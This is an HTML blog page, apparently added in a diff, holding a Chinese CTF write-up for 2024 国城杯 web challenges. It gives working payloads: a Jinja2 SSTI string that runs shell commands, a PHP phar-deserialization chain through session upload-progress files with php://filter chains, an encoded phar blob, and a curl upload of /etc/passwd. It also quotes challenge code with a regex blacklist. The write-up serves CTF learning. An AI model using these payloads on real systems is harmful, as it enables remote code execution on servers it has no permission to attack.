@@ -1,0 +1,373 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>24国城杯 | DDL'S BLOG</title><meta name="author" content="DDL"><meta name="copyright" content="DDL"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="2024国城杯1Easy Jellyjava欠着 2Ez_Gallery 账号admin；密码123456；直接爆也行，验证码可以重复用  存在文件包含，不知道flag在哪 info?file&#x3D;&#x2F;proc&#x2F;self&#x2F;cmdline发现题目app.py；然后去读取题目源码 源码的shell路由是个ssti攻击点 黑名单 12345678blacklist_pa">
+<meta property="og:type" content="article">
+<meta property="og:title" content="24国城杯">
+<meta property="og:url" content="http://example.com/2024/12/10/24%E5%9B%BD%E5%9F%8E%E6%9D%AF/index.html">
+<meta property="og:site_name" content="DDL&#39;S BLOG">
+<meta property="og:description" content="2024国城杯1Easy Jellyjava欠着 2Ez_Gallery 账号admin；密码123456；直接爆也行，验证码可以重复用  存在文件包含，不知道flag在哪 info?file&#x3D;&#x2F;proc&#x2F;self&#x2F;cmdline发现题目app.py；然后去读取题目源码 源码的shell路由是个ssti攻击点 黑名单 12345678blacklist_pa">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/img/avatar.png">
+<meta property="article:published_time" content="2024-12-10T11:34:52.000Z">
+<meta property="article:modified_time" content="2024-12-10T11:38:38.773Z">
+<meta property="article:author" content="DDL">
+<meta property="article:tag" content="5wp">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/avatar.png"><link rel="shortcut icon" href="/img/avatar.png"><link rel="canonical" href="http://example.com/2024/12/10/24%E5%9B%BD%E5%9F%8E%E6%9D%AF/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '24国城杯',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  isShuoshuo: false
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">8</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> blog</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> categories</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> tags</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> crchives</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> link</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> message</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> about</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">DDL'S BLOG</span></a><a class="nav-page-title" href="/"><span class="site-name">24国城杯</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> blog</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> categories</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> tags</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> crchives</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> link</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> message</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> about</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">24国城杯</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-12-10T11:34:52.000Z" title="Created 2024-12-10 19:34:52">2024-12-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-12-10T11:38:38.773Z" title="Updated 2024-12-10 19:38:38">2024-12-10</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">3.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading Time:</span><span>17mins</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="2024国城杯"><a href="#2024国城杯" class="headerlink" title="2024国城杯"></a>2024国城杯</h1><h2 id="1Easy-Jelly"><a href="#1Easy-Jelly" class="headerlink" title="1Easy Jelly"></a>1Easy Jelly</h2><p>java欠着</p>
+<h2 id="2Ez-Gallery"><a href="#2Ez-Gallery" class="headerlink" title="2Ez_Gallery"></a>2Ez_Gallery</h2><p><img src="https://github.com/DDL08/images/blob/img/img/image-20241210145520862.png?raw=true" alt="image-20241210145520862"></p>
+<p>账号admin；密码123456；直接爆也行，验证码可以重复用</p>
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241207162652658.png?raw=true" alt="image-20241207162652658"></p>
+<p>存在文件包含，不知道flag在哪</p>
+<p>info?file&#x3D;&#x2F;proc&#x2F;self&#x2F;cmdline发现题目app.py；然后去读取题目源码</p>
+<p>源码的shell路由是个ssti攻击点</p>
+<p>黑名单</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">blacklist_patterns = [r&#x27;.*length.*&#x27;,r&#x27;.*count.*&#x27;,r&#x27;.*[0-</span><br><span class="line">9].*&#x27;,r&#x27;.*\..*&#x27;,r&#x27;.*soft.*&#x27;]</span><br><span class="line">if any(re.search(pattern, expression) for pattern in blacklist_patterns):</span><br><span class="line">return Response(&#x27;wafwafwaf&#x27;)</span><br><span class="line">try:</span><br><span class="line">result =</span><br><span class="line">jinja2.Environment(loader=jinja2.BaseLoader()).from_string(expression).render(&#123;&quot;</span><br><span class="line">request&quot;: request&#125;)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">session_factory = SignedCookieSessionFactory(&#x27;secret_key&#x27;)</span><br><span class="line">with Configurator(session_factory=session_factory) as config:</span><br></pre></td></tr></table></figure>
+
+<p>根据这里config被当作局部变量👆</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;cycler[&#x27;__init__&#x27;][&#x27;__globals__&#x27;][&#x27;__builtins__&#x27;][&#x27;exec&#x27;](&quot;getattr(request,&#x27;add_response_callback&#x27;)(lambda request,response:setattr(response, &#x27;text&#x27;, getattr(getattr(__import__(&#x27;os&#x27;),&#x27;popen&#x27;)(&#x27;whoami&#x27;),&#x27;read&#x27;)()))&quot;,&#123;&#x27;request&#x27;:request&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241210155457283.png?raw=true" alt="image-20241210155457283"></p>
+<h2 id="3n0ob-un4er"><a href="#3n0ob-un4er" class="headerlink" title="3n0ob_un4er"></a>3n0ob_un4er</h2><p><strong>提示</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Please take me back to the golden age of PHP😭.</span><br><span class="line">不用管$SECRET，主要考虑copy()怎么利用</span><br><span class="line">你可以创建一个session文件吗？</span><br><span class="line">要怎么消除session文件中的垃圾字符呢？</span><br><span class="line">执行/readflag读取flag</span><br></pre></td></tr></table></figure>
+
+<p><strong>题目源码</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$SECRET  = `/readsecret`;</span><br><span class="line">include &quot;waf.php&quot;;</span><br><span class="line">class User &#123;</span><br><span class="line">    public $role;</span><br><span class="line">    function __construct($role) &#123;</span><br><span class="line">        $this-&gt;role = $role;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Admin&#123;</span><br><span class="line">    public $code;</span><br><span class="line">    function __construct($code) &#123;</span><br><span class="line">        $this-&gt;code = $code;</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        echo &quot;Admin can play everything!&quot;;</span><br><span class="line">        eval($this-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function game($filename) &#123;</span><br><span class="line">    if (!empty($filename)) &#123;</span><br><span class="line">        if (waf($filename) &amp;&amp; @copy($filename , &quot;/tmp/tmp.tmp&quot;)) &#123;</span><br><span class="line">            echo &quot;Well done!&quot;;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &quot;Copy failed.&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;User can play copy game.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function set_session()&#123;</span><br><span class="line">    global $SECRET;</span><br><span class="line">    $data = serialize(new User(&quot;user&quot;));</span><br><span class="line">    $hmac = hash_hmac(&quot;sha256&quot;, $data, $SECRET);</span><br><span class="line">    setcookie(&quot;session-data&quot;, sprintf(&quot;%s-----%s&quot;, $data, $hmac));</span><br><span class="line">&#125;</span><br><span class="line">function check_session() &#123;</span><br><span class="line">    global $SECRET;</span><br><span class="line">    $data = $_COOKIE[&quot;session-data&quot;];</span><br><span class="line">    list($data, $hmac) = explode(&quot;-----&quot;, $data, 2);</span><br><span class="line">    if (!isset($data, $hmac) || !is_string($data) || !is_string($hmac) || !hash_equals(hash_hmac(&quot;sha256&quot;, $data, $SECRET), $hmac)) &#123;</span><br><span class="line">        die(&quot;hacker!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $data = unserialize($data);</span><br><span class="line">    if ( $data-&gt;role === &quot;user&quot; )&#123;</span><br><span class="line">        game($_GET[&quot;filename&quot;]);</span><br><span class="line">    &#125;else if($data-&gt;role === &quot;admin&quot;)&#123;</span><br><span class="line">        return new Admin($_GET[&#x27;code&#x27;]);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">if (!isset($_COOKIE[&quot;session-data&quot;])) &#123;</span><br><span class="line">    set_session();</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    check_session();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="做法一"><a href="#做法一" class="headerlink" title="做法一"></a>做法一</h3><h4 id="编码命令"><a href="#编码命令" class="headerlink" title="编码命令"></a>编码命令</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat test.phar | base64 -w0 | python3 -c &quot;import sys;print(&#x27;&#x27;.join([&#x27;=&#x27; + hex(ord(i))[2:] + &#x27;=00&#x27; for i in sys.stdin.read()]).upper())&quot;</span><br><span class="line">总的来说是把文件base64编码之后再转为utf-16</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>cat test.phar | base64 -w0</code> 会将 <code>test.phar</code> 文件的内容转换为 Base64 编码，并输出为一个单行字符串。</li>
+<li><code>python3 -c &quot;...&quot;</code>：这是一个在命令行中执行的 Python 代码。</li>
+<li><code>import sys</code>：导入 Python 的 <code>sys</code> 模块，通常用于访问标准输入、输出和错误。</li>
+<li><code>sys.stdin.read()</code>：从标准输入（此处为通过管道传递的 Base64 编码内容）读取所有内容。</li>
+<li><code>for i in sys.stdin.read()</code>：对于从标准输入读取的每个字符，执行以下操作：<ol>
+<li><code>ord(i)</code>：获取字符 <code>i</code> 的 Unicode 编码值（即字符的整数表示）。</li>
+<li><code>hex(ord(i))[2:]</code>：将字符的 Unicode 编码值转换为十六进制表示，并去掉 <code>0x</code> 前缀。</li>
+<li><code>=&#39; + hex(ord(i))[2:] + &#39;=00&#39;</code>：为每个字符的十六进制值添加 <code>=</code> 前缀和 <code>=00</code> 后缀。</li>
+<li><code>&#39;&#39;.join([...])</code>：将所有字符生成的字符串拼接在一起。</li>
+<li><code>upper()</code>：将整个拼接后的字符串转换为大写字母。</li>
+</ol>
+</li>
+</ul>
+<p>让gpt把他换成python脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line"></span><br><span class="line"># 读取 test.phar 文件</span><br><span class="line">with open(&#x27;C:/Users/LEGION/Desktop/新建文件夹/02/src/python-code/ctf/竞争/test.phar&#x27;, &#x27;rb&#x27;) as file:</span><br><span class="line">    file_data = file.read()</span><br><span class="line"></span><br><span class="line"># Base64 编码</span><br><span class="line">encoded_data = base64.b64encode(file_data).decode(&#x27;utf-8&#x27;)</span><br><span class="line"></span><br><span class="line"># 转换为特定格式的十六进制字符串</span><br><span class="line">result = &#x27;&#x27;.join([f&quot;=&#123;hex(ord(char))[2:].upper()&#125;=00&quot; for char in encoded_data])</span><br><span class="line"></span><br><span class="line"># 打印结果</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241209170738871.png?raw=true" alt="image-20241209170738871"></p>
+<p>编码结果加上14个A;凑够3的3次方的整数倍数；让编码结果没有等于号</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=70=00=74=00=41=00=41=00=41=00=41=00=41=00=51=00=41=00=41=00=41=00=42=00=45=00=41=00=41=00=41=00=41=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=33=00=41=00=41=00=41=00=41=00=54=00=7A=00=6F=00=31=00=4F=00=69=00=4A=00=42=00=5A=00=47=00=31=00=70=00=62=00=69=00=49=00=36=00=4D=00=54=00=70=00=37=00=63=00=7A=00=6F=00=30=00=4F=00=69=00=4A=00=6A=00=62=00=32=00=52=00=6C=00=49=00=6A=00=74=00=7A=00=4F=00=6A=00=49=00=77=00=4F=00=69=00=4A=00=7A=00=65=00=58=00=4E=00=30=00=5A=00=57=00=30=00=6F=00=4A=00=79=00=39=00=79=00=5A=00=57=00=46=00=6B=00=5A=00=6D=00=78=00=68=00=5A=00=79=00=63=00=70=00=4F=00=79=00=49=00=37=00=66=00=51=00=67=00=41=00=41=00=41=00=42=00=30=00=5A=00=58=00=4E=00=30=00=4C=00=6E=00=52=00=34=00=64=00=41=00=51=00=41=00=41=00=41=00=44=00=49=00=69=00=31=00=5A=00=6E=00=42=00=41=00=41=00=41=00=41=00=41=00=78=00=2B=00=66=00=39=00=69=00=32=00=41=00=51=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=48=00=52=00=6C=00=63=00=33=00=54=00=4A=00=78=00=55=00=70=00=50=00=31=00=42=00=38=00=55=00=72=00=53=00=4C=00=65=00=57=00=78=00=57=00=39=00=65=00=4A=00=34=00=35=00=62=00=51=00=2F=00=49=00=30=00=58=00=6A=00=67=00=2F=00=49=00=7A=00=57=00=4E=00=6E=00=59=00=73=008=00=6A=00=67=00=2F=00=49=00=7A=00=57=00=4E=00=6E=00=59=00=73=00=63=00=37=00=2B=00=5A=00=74=00=41=00=4D=00=41=00=41=00=41=00=42=00=48=00=51=00=6B=00=31=00=43=00AAAAAAAAAAAAAA</span><br></pre></td></tr></table></figure>
+
+<h4 id="copy文件"><a href="#copy文件" class="headerlink" title="copy文件"></a>copy文件</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=php://filter/read=php://filter/read=convert.base64-decode|convert.base64-decode|convert.base64-decode|convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=/tmp/sess_litsasuk</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Quoted-Printable 是一种编码方式，常用于在电子邮件等传输中将字节流编码为可打印的 ASCII 字符。如果数据包含了类似邮件正文的内容，它可能会用这种方式对数据进行编码。</span><br></pre></td></tr></table></figure>
+
+<h4 id="读文件触发phar反序列化"><a href="#读文件触发phar反序列化" class="headerlink" title="读文件触发phar反序列化"></a>读文件触发phar反序列化</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=phar:///tmp/tmp.tmp/test.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241209160644456.png?raw=true" alt="image-20241209160644456"></p>
+<h3 id="做法二"><a href="#做法二" class="headerlink" title="做法二"></a>做法二</h3><p>垃圾数据处理这块方法不一样</p>
+<h4 id="垃圾处理"><a href="#垃圾处理" class="headerlink" title="垃圾处理"></a>垃圾处理</h4><p>用&lt;尖括号结合过滤器去掉后边的数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=string.strip_tags/resource=sess_121</span><br></pre></td></tr></table></figure>
+
+<p>前面的垃圾数据可以结合 php 的 base64 解码松散性绕过（非 base64 字符忽视）。</p>
+<h3 id="发送数据"><a href="#发送数据" class="headerlink" title="发送数据"></a>发送数据</h3><h4 id="法一；html表单发送"><a href="#法一；html表单发送" class="headerlink" title="法一；html表单发送"></a>法一；html表单发送</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;http://http://125.70.243.22:31406/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;&lt;?php phpinfo();?&gt;&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="法二；curl发送"><a href="#法二；curl发送" class="headerlink" title="法二；curl发送"></a>法二；curl发送</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://127.0.0.1：8001/ -H &#x27;Cookie: PHPSESSID=litsasuk&#x27; -F &#x27;PHP_SESSION_UPLOAD_PROGRESS=[Your_data]&#x27;  -F &#x27;file=@/etc/passwd&#x27; </span><br></pre></td></tr></table></figure>
+
+<h3 id="萌新版本地环境配置"><a href="#萌新版本地环境配置" class="headerlink" title="萌新版本地环境配置"></a>萌新版本地环境配置</h3><h4 id="1-在windows上创建phar对象失败"><a href="#1-在windows上创建phar对象失败" class="headerlink" title="1.在windows上创建phar对象失败"></a>1.在windows上创建phar对象失败</h4><p>先看看php -i | findstr phar.readonly 是不是为Off；我显示的就是On,在php.ini里面修改它(去掉前面的;注释，然后ON换成Off)；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这意味着 PHP 不再禁止创建或修改 Phar 文件。</span><br></pre></td></tr></table></figure>
+
+<p>找到php.ini文件，没有的话就从<code>php.ini-development</code> 或 <code>php.ini-production</code> 文件挑一个复制下来</p>
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241209142047551.png?raw=true" alt="image-20241209142047551"></p>
+<p>修改php.ini里面的内容</p>
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241209142008914.png?raw=true" alt="image-20241209142008914"></p>
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241209142455703.png?raw=true" alt="image-20241209142455703"></p>
+<p>可见在左侧出现test.phar文件</p>
+<h4 id="2-服务器上session的配置"><a href="#2-服务器上session的配置" class="headerlink" title="2.服务器上session的配置"></a>2.服务器上session的配置</h4><p>当你想在服务器上配置这个题目环境的时候，可能会遇到的一些问题，这里给出整理</p>
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241209144712973.png?raw=true" alt="image-20241209144712973"></p>
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241209144914319.png?raw=true" alt="image-20241209144914319"></p>
+<ul>
+<li><strong>session.auto_start</strong><ul>
+<li><strong>自动初始化Session</strong>，<strong>不再需要执行session_start()<strong>。但默认情况下，也是通常情况下，</strong>这个选项都是默认关闭的</strong>。</li>
+</ul>
+</li>
+<li><strong>session.upload_progress.enabled &#x3D; on</strong><ul>
+<li><strong>默认开启</strong>这个选项，<strong>表示<code>upload_progress</code>功能正常使用</strong></li>
+</ul>
+</li>
+<li><strong>session.upload_progress.cleanup &#x3D; on</strong>这个特别重要，条件竞争就是竞争这个<ul>
+<li><strong>默认开启</strong>这个选项，<strong>表示当文件上传结束后，php将会立即清空对应session文件中的内容</strong>。</li>
+</ul>
+</li>
+<li><strong>session.upload_progress.name &#x3D; “PHP_SESSION_UPLOAD_PROGRESS”</strong><ul>
+<li><strong>当一个文件上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时（这部分数据用户可控），上传进度可以在SESSION中获得。当PHP检测到这种POST请求时，它会在SESSION中添加一组数据（系统自动初始化session）, 索引是session.upload_progress.prefix与session.upload_progress.name连接在一起的值。</strong></li>
+</ul>
+</li>
+<li><strong><code>session.upload_progress</code>特性</strong><ul>
+<li><strong><code>PHPSESSID</code> 是会话 ID</strong>：它与会话文件生成相关，通常是由 PHP 自动处理的。当浏览器第一次访问 PHP 页面时，会自动生成 <code>PHPSESSID</code> 并在服务器端创建会话文件（如 <code>sess_123</code>）。</li>
